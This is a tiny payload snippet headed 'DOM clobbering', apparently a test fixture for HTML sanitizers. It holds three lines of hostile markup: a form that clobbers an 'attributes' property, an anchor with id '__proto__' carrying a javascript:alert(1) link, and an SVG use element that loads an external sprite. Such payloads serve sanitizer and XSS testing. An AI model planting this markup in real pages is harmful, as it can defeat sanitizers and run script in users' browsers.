# DOM clobbering

<form id="attributes"><input name="attributes"></form>
<a id="__proto__" href="javascript:alert(1)">payload</a>
<svg><use href="https://qa-invalid.example/sprite.svg#x"></use></svg>
